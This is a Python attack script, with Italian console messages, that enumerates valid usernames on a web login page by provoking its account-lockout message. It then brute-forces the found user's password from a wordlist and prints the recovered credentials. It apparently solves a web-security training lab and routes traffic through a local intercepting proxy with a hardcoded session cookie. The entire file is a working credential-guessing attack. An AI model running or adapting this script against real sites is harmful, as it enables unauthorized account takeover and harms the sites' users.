import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http' : 'http://127.0.0.1:8080' , 'https' :'http://127.0.0.1:8080'}


username_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\usernames.txt"
password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def perform_request(url,username,password):
    uri = '/login'
    data = {'username' : username , 'password' : password}
    cookies = {'session' : 'emMzecb9iZem7NYdVyCxEOYyw08WMP7b'}
    r = requests.post(url + uri, data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    return r


def username_enumerator(url,username_list):
    password = 'test'
    with open(username_list, 'r') as u:
        usernames = u.readlines()
        for x in usernames:
            username = x.split("\n")[0]
            i = 1
            while i != 6: 
                response = perform_request(url,username,password)
                sys.stdout.write("[+] Sto testando il nome utente {0}, richiesta post n. {1}\r".format(username,i))
                sys.stdout.flush()
                sys.stdout.write("\033[K")
                if  "You have made too many incorrect login attempts." in response.text:
                    sys.stdout.write("[+] Nome utente trovato! ==> {0}\r\n".format(username))
                    sys.stdout.flush()
                    u.close()
                    return username
                i += 1
    u.close()


def password_enumerator(url,username,password_list):
    with open(password_list, 'r') as p:
        passwords = p.readlines()
        for x in passwords:
            password = x.split("\n")[0]
            response = perform_request(url,username,password)
            sys.stdout.write("[+] Testando la password: %s\r" % password)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            if "You have made too many incorrect login attempts." not in response.text:
                sys.stdout.write("[+] Password trovata! ==> %s\r\n" % password)
                sys.stdout.flush()
                p.close()
                return password
    p.close()


def countdown(seconds):
    while seconds:
        mins, secs = divmod(seconds, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        seconds -= 1
    




if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()



    print("[+] Iniziamo testando una lista di nomi utente. L'utente per il quale compare il messaggio di errore 'You have made too many incorrect login attempts.' è probabile che esista.\n")
    username = username_enumerator(url,username_list)

    if not username:
        print("\n\n[-] Nessun nome utente utile individuato")
        sys.exit()

    print("\n[+] Procediamo testando una lista di password per l'utente {0}. La password per la quale non compare un messaggio di errore nonostante si sia raggiunto il limite di tentativi, è quella corretta.\n".format(username))
    password = password_enumerator(url,username,password_list)

    if not password:
        print("\n\n[-] Nessuna password individuata")
        sys.exit()


    print("\n[+] Attendere un minuto e provare ad effettuare il login con le credenziali {0}:{1} all'indirizzo {2}/login".format(username,password,url))
    countdown(60)
    print("\nVia LIbera!")
